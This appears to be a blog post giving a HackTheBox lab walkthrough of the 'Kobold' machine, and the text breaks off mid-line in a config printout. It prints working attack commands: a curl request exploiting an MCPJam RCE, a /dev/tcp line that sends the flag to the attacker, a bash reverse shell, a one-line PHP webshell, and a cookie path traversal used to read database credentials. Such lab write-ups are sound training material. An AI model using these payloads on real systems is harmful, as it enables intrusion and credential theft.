@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/08/06/hackthebox-kobold/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewKobold is a medium-difficulty Linux machine running a suite of web services behind nginx. We’ll start by fuzzing virtual hosts thanks to a wildcard SSL certificate, which uncovers an MCPJam In">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Kobold">
+<meta property="og:url" content="http://fouedsaidi.com/2026/08/06/Hackthebox-Kobold/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewKobold is a medium-difficulty Linux machine running a suite of web services behind nginx. We’ll start by fuzzing virtual hosts thanks to a wildcard SSL certificate, which uncovers an MCPJam In">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Kobold/Kobold.png">
+<meta property="article:published_time" content="2026-08-06T15:56:02.000Z">
+<meta property="article:modified_time" content="2026-08-06T15:59:26.721Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Kobold/Kobold.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Kobold -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Kobold</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-08-06 18:56:02</span>
+        <span class="mobile">2026-08-06 18:56:02</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-08-06 18:59:26</span>
+            <span class="mobile">2026-08-06 18:59:26</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Kobold is a medium-difficulty Linux machine running a suite of web services behind nginx. We’ll start by fuzzing virtual hosts thanks to a wildcard SSL certificate, which uncovers an MCPJam Inspector instance vulnerable to CVE-2026-23744, an unauthenticated RCE through the <code>/api/mcp/connect</code> endpoint that lands us a shell as <code>ben</code>. From there, we’ll abuse a shared bind mount between the host and a PrivateBin Docker container to drop a PHP webshell into the container’s web root, then trigger it through CVE-2025-49596, a Local File Inclusion in PrivateBin’s template-switching feature, to leak the database credentials from the container config. Finally, we’ll reuse those credentials to log into the Arcane Docker management panel on port 3552 and spin up a privileged container that mounts the host filesystem, giving us full root.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Kobold/Kobold.png"
+                      alt="Kobold-info-card"
+                ><figcaption>Kobold-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><p>A full TCP port scan reveals four open services:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -sC -sV -p- --min-rate 5000 10.129.11.204</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 20:37 PDT</span><br><span class="line">Nmap scan report for kobold.htb (10.129.11.204)</span><br><span class="line">Host is up (0.65s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)</span><br><span class="line">|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)</span><br><span class="line">80/tcp   open  http     nginx 1.24.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.24.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to https://kobold.htb/</span><br><span class="line">443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)</span><br><span class="line">|_http-title: Kobold Operations Suite</span><br><span class="line">|_http-server-header: nginx/1.24.0 (Ubuntu)</span><br><span class="line">| ssl-cert: Subject: commonName=kobold.htb</span><br><span class="line">| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb</span><br><span class="line">3552/tcp open  http     Golang net/http server</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></div>
+
+<p>A few things immediately stand out here. Port 80 just redirects us to HTTPS on <code>kobold.htb</code>, and the SSL certificate on port 443 carries a wildcard SAN (<code>*.kobold.htb</code>), which strongly hints that there are virtual hosts waiting to be discovered. On top of that, port 3552 is serving a Go-based web application which we’ll later identify as Arcane, a Docker management UI.</p>
+<h4 id="Virtual-Host-Discovery"><a href="#Virtual-Host-Discovery" class="headerlink" title="Virtual Host Discovery"></a>Virtual Host Discovery</h4><p>Let’s add <code>kobold.htb</code> to our <code>/etc/hosts</code> file and browse the main site, which greets us with the <strong>Kobold Operations Suite</strong> landing page. Since that wildcard certificate is basically begging us to look for subdomains, we go ahead and fuzz for virtual hosts, which turns up two additional subdomains:</p>
+<ul>
+<li><code>mcp.kobold.htb</code> — <strong>MCPJam Inspector</strong>, a development platform for MCP (Model Context Protocol) servers</li>
+<li><code>bin.kobold.htb</code> — <strong>PrivateBin 2.0.2</strong>, a self-hosted encrypted pastebin</li>
+</ul>
+<p>Let’s add all of these entries to our hosts file:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ echo &quot;10.129.11.204 kobold.htb mcp.kobold.htb bin.kobold.htb&quot; | sudo tee -a /etc/hosts</span><br><span class="line">10.129.11.204 kobold.htb mcp.kobold.htb bin.kobold.htb</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Foothold-—-CVE-2026-23744-MCPJam-Inspector-RCE"><a href="#Foothold-—-CVE-2026-23744-MCPJam-Inspector-RCE" class="headerlink" title="Foothold — CVE-2026-23744 (MCPJam Inspector RCE)"></a>Foothold — CVE-2026-23744 (MCPJam Inspector RCE)</h3><h4 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h4><p>Browsing to <code>https://mcp.kobold.htb</code> shows us the MCPJam Inspector interface. A bit of research on this software leads us to <strong>CVE-2026-23744</strong> (GHSA-232v-j27c-5pp6): MCPJam Inspector versions 1.4.2 and earlier expose an HTTP endpoint <code>/api/mcp/connect</code> that lets unauthenticated users specify arbitrary commands to be executed on the server. The <code>serverConfig</code> parameter accepts a <code>command</code> and an <code>args</code> array that get executed directly on the host, which is exactly the kind of primitive we’re looking for.</p>
+<h4 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>Let’s set up a netcat listener and send a crafted POST request to the vulnerable endpoint to exfiltrate the user flag as a proof of concept:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -lnvp 9002 &gt; /tmp/userflag.txt 2&gt;&amp;1 &amp;</span><br><span class="line">[1] 8354</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ curl -k -s -X POST https://mcp.kobold.htb/api/mcp/connect \</span><br><span class="line">  -H &quot;Content-Type: application/json&quot; \</span><br><span class="line">  -d &#x27;&#123;&quot;serverConfig&quot;:&#123;&quot;command&quot;:&quot;bash&quot;,&quot;args&quot;:[&quot;-c&quot;,&quot;cat /home/ben/user.txt &gt; /dev/tcp/10.10.16.163/9002&quot;],&quot;env&quot;:&#123;&#125;&#125;,&quot;serverId&quot;:&quot;exfil4&quot;&#125;&#x27;</span><br><span class="line">&#123;&quot;success&quot;:false,&quot;error&quot;:&quot;Connection failed for server exfil4: MCP error -32000: Connection closed&quot;,&quot;details&quot;:&quot;MCP error -32000: Connection closed&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>The error response is completely expected here. The MCP protocol fails to initialize because our command isn’t actually an MCP server, but the command still runs on the target before that failure. Let’s check our listener:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ cat /tmp/userflag.txt</span><br><span class="line">listening on [any] 9002 ...</span><br><span class="line">connect to [10.10.16.163] from (UNKNOWN) [10.129.11.204] 35350</span><br><span class="line">72df902dd9b7d0ce47589ebc4a714d05</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Shell-as-Ben"><a href="#Shell-as-Ben" class="headerlink" title="Shell as Ben"></a>Shell as Ben</h4><p>Exfiltrating the flag is nice, but let’s turn this into a proper interactive shell by firing off a bash reverse shell instead:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ curl -k -s -X POST https://mcp.kobold.htb/api/mcp/connect \</span><br><span class="line">  -H &quot;Content-Type: application/json&quot; \</span><br><span class="line">  -d &#x27;&#123;&quot;serverConfig&quot;:&#123;&quot;command&quot;:&quot;bash&quot;,&quot;args&quot;:[&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.163/4444 0&gt;&amp;1&quot;],&quot;env&quot;:&#123;&#125;&#125;,&quot;serverId&quot;:&quot;revshell&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -lnvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.163] from (UNKNOWN) [10.129.11.204] 35350</span><br><span class="line">ben@kobold:~$ whoami</span><br><span class="line">ben</span><br><span class="line">ben@kobold:~$ id</span><br><span class="line">uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)</span><br><span class="line">ben@kobold:~$ cat ~/user.txt</span><br><span class="line">72df902dd9b7d0ce47589ebc4a714d05</span><br></pre></td></tr></table></figure></div>
+
+<p>And just like that we have our shell as <code>ben</code> and we can grab the user flag:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">72df902dd9b7d0ce47589ebc4a714d05</span><br></pre></td></tr></table></figure></div>
+
+<p>Notice that <code>ben</code> is a member of the <code>operator</code> group (GID 37), which is going to matter a lot in the next step.</p>
+<h3 id="Lateral-Movement-—-CVE-2025-49596-PrivateBin-LFI"><a href="#Lateral-Movement-—-CVE-2025-49596-PrivateBin-LFI" class="headerlink" title="Lateral Movement — CVE-2025-49596 (PrivateBin LFI)"></a>Lateral Movement — CVE-2025-49596 (PrivateBin LFI)</h3><h4 id="Enumeration-as-Ben"><a href="#Enumeration-as-Ben" class="headerlink" title="Enumeration as Ben"></a>Enumeration as Ben</h4><p>Poking around the filesystem as <code>ben</code>, we stumble upon a very interesting shared directory:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ben@kobold:~$ ls -la /privatebin-data/</span><br><span class="line">total 20</span><br><span class="line">drwxrwx---  5 root operator 4096 Mar 15 21:23 .</span><br><span class="line">drwxr-xr-x 22 root root     4096 Mar 16 20:57 ..</span><br><span class="line">drwxrwx---  2 root operator 4096 Mar 15 21:23 certs</span><br><span class="line">drwxr-x---  2 root       82 4096 Mar 15 21:23 cfg</span><br><span class="line">drwxrwxrwx  5 root operator 4096 Mar 15 21:23 data</span><br></pre></td></tr></table></figure></div>
+
+<p>The <code>data</code> directory is world-writable, and since <code>ben</code> is part of the <code>operator</code> group that owns these directories, we have write access here. This <code>/privatebin-data/data</code> directory is actually a bind mount shared between the host and the PrivateBin Docker container, meaning anything we write here shows up inside the container’s web root.</p>
+<h4 id="Checking-Docker"><a href="#Checking-Docker" class="headerlink" title="Checking Docker"></a>Checking Docker</h4><p>Let’s confirm what containers are in play:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ben@kobold:~$ sg docker -c &quot;docker images&quot;</span><br><span class="line">REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">mysql                         latest    f66b7a288113   6 weeks ago    922MB</span><br><span class="line">privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   4 months ago   122MB</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see two Docker images: MySQL and the PrivateBin container that’s serving the <code>bin.kobold.htb</code> service.</p>
+<h4 id="Exploiting-PrivateBin-LFI-CVE-2025-49596"><a href="#Exploiting-PrivateBin-LFI-CVE-2025-49596" class="headerlink" title="Exploiting PrivateBin LFI (CVE-2025-49596)"></a>Exploiting PrivateBin LFI (CVE-2025-49596)</h4><p>PrivateBin 2.0.2 is vulnerable to <strong>CVE-2025-49596</strong> (GHSA-g2j9-g8r5-rg82): when the <code>templateselection</code> configuration option is enabled, the server blindly trusts the <code>template</code> cookie value to decide which PHP template file to load. By stuffing a path traversal into that cookie, we can make it include an arbitrary local PHP file, and since we can already write into the container’s web root, this becomes a straightforward path to code execution.</p>
+<p>First, let’s write a PHP webshell into the shared data directory from <code>ben</code>‘s shell:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ben@kobold:~$ echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; /privatebin-data/data/shell.php</span><br><span class="line">ben@kobold:~$ ls -la /privatebin-data/data/shell.php</span><br><span class="line">-rw-r--r-- 1 ben ben 31 Mar 24 21:02 /privatebin-data/data/shell.php</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we trigger the LFI by setting the <code>template</code> cookie to traverse into the data directory where our webshell lives:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ curl -k -s -b &#x27;template=../data/shell&#x27; &#x27;https://bin.kobold.htb/?cmd=id&#x27;</span><br><span class="line">uid=82(www-data) gid=82(www-data) groups=82(www-data)</span><br></pre></td></tr></table></figure></div>
+
+<p>And we now have RCE inside the PrivateBin container as <code>www-data</code>.</p>
+<h4 id="Credential-Extraction"><a href="#Credential-Extraction" class="headerlink" title="Credential Extraction"></a>Credential Extraction</h4><p>Let’s use our newly acquired RCE to read the PrivateBin configuration file inside the container and look for anything juicy:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ curl -k -s -b &#x27;template=../data/shell&#x27; &#x27;https://bin.kobold.htb/?cmd=cat+/srv/cfg/conf.php&#x27; | grep -A5 &quot;pwd&quot;</span><br><span class="line">...</span><br><span class="line">[model]</span><br><span class="line">; example of DB configuration for MySQL</span><br><span class="line">; Temporarily disabling while we migrate to new server for loadbalancing</span><br><span class="line">;class = Database</span><br><span class="line">[model_options]</span><br><span class="line">dsn = &quot;mysql:host=localhost;dbname=privatebin;charset=UTF8&quot;</span><br><span class="line">tbl = &quot;privatebin_&quot;    ; table prefix</span><br><span class="line">usr = &quot;privatebin&quot;</span><br><span class="line">pwd = 